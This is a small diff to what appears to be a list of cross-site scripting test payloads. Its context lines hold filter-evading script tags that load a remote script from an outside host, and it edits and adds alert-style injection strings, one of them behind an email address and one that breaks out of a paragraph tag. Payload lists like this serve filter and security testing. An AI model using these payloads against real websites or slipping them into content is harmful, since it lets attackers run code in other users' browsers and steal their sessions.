@@ -530,4 +530,5 @@ a="get";
 <script "a='>'" id=xss src="http://ha.ckers.org/xss.js"></script>
 <script a=`>` id=xss src="http://ha.ckers.org/xss.js"></script>
 <script>document.write("<scri");</script>pt id=xss src="http://ha.ckers.org/xss.js"></script>
-hoangtpm2005@gmail.com [SEP] <script>alert(1)</script>
+hoangtpm2005@gmail.com <script>alert(1)</script>
+</p><script>alert(1)</script><p>
